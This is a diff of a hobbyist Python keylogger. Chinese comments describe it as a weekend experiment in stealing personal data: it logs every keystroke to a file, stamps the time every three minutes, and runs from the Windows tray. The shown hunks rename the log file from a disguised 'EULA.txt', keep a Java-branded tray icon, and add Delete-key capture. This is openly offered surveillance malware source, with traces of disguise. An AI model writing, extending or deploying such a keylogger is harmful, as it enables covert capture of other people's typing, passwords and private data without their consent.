@@ -1,3 +1,13 @@
+#2023-11-25 & 26 製作
+#有一天睡前想到，個資是不是一個簡單的程式就能輕易竊取?
+#周末寫了這個，執行後開始記錄使用者的鍵盤輸入
+#每3分鐘輸出當時電腦上的時間
+#每次輸入時都會馬上紀錄，使用Append，因此無法自動處理Backspace/del鍵
+#最後還是需要人來解讀(b)(del)
+#程式會在 windows 10 的狀態列中
+#狀態列icon右鍵點退出 + termial按enter後才會停止
+#(windows防火牆跟任何防毒軟體都會擋下來，只能在vscode/pycharm 等IDE中執行才可)
+
 from pynput import keyboard as kb
 from threading import Timer
 import time
@@ -6,8 +16,7 @@ import PIL.Image
 import sys
 
 image = PIL.Image.open("2-keylogger\java.ico")
-file = open("EULA.txt", "a")
-
+file = open("2-keylogger\loggings.txt", "a")
 
 class RepeatTimer(Timer):
     def run(self):
@@ -40,6 +49,8 @@ def Pressed(key):
         file.write("(ctr)")
     elif(str(key)=="Key.shift"):
         print("", end="")
+    elif(str(key)=="Key.delete"):
+        print("(del)", end="")
     elif(len(skey)>1):
         print("", end="")
 
